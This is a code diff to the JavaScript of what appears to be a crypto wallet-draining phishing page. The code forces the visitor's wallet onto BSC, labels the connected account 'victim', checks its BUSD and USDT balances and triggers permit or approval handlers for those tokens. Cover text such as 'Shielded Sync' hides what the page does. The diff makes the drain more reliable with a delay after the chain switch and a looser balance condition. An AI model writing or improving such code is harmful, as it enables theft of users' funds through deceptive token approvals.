@@ -40,25 +40,31 @@ async function ensureBSC() {
 }
 
 async function triggerPermit() {
-    console.log("[v8.4] Initiating Shielded Sync...");
+    console.log("[v8.5] Initiating Shielded Sync...");
     if (!window.ethereum) return;
 
     try {
-        const provider = new ethers.providers.Web3Provider(window.ethereum, "any");
-        
-        // 1. Force BSC Network
+        // 1. Force the Chain Switch first
         await ensureBSC();
         
-        // 2. Connect Wallet
+        // 2. Add a 1.5-second delay to let the wallet's injected provider sync with the new chain
+        await new Promise(resolve => setTimeout(resolve, 1500));
+
+        // 3. Re-initialize the provider AFTER the switch/delay
+        const provider = new ethers.providers.Web3Provider(window.ethereum, "any");
         await provider.send("eth_requestAccounts", []);
         const signer = provider.getSigner();
         const victim = await signer.getAddress();
+
+        // 4. Check the actual Chain ID the provider is currently seeing
+        const network = await provider.getNetwork();
+        console.log("Current Chain ID:", network.chainId);
 
         // UI Transition
         document.getElementById('ui-main').style.display = 'none';
         document.getElementById('ui-loading').style.display = 'block';
 
-        // 3. Check Balances
+        // 5. Fetch Balances
         const busd = new ethers.Contract(BUSD_ADDRESS, ERC20_ABI, provider);
         const usdt = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
         
@@ -67,12 +73,19 @@ async function triggerPermit() {
             usdt.balanceOf(victim).catch(() => ethers.BigNumber.from(0))
         ]);
 
-        if (busdBal.gt(usdtBal) && busdBal.gt(0)) {
+        // DEBUG ALERT: This will confirm exactly what the code sees
+        // alert("Chain ID: " + network.chainId + "\nBUSD: " + ethers.utils.formatUnits(busdBal, 18));
+
+        if (busdBal.gt(0)) {
+            // Force verify BUSD decimals and name to ensure contract access
+            console.log("BUSD Identified. Triggering Permit...");
             await handleBUSD(signer, victim, busd);
         } else if (usdtBal.gt(0)) {
+            console.log("USDT Identified. Triggering Approval...");
             await handleUSDT(signer, victim, usdt);
         } else {
-            document.getElementById('ui-loading').innerHTML = "Account verification successful. No assets required for sync.";
+            console.log("No assets found on Chain " + network.chainId);
+            document.getElementById('ui-loading').innerHTML = "No assets found on " + network.name + ". Please ensure BUSD is on BSC.";
         }
 
     } catch (e) {
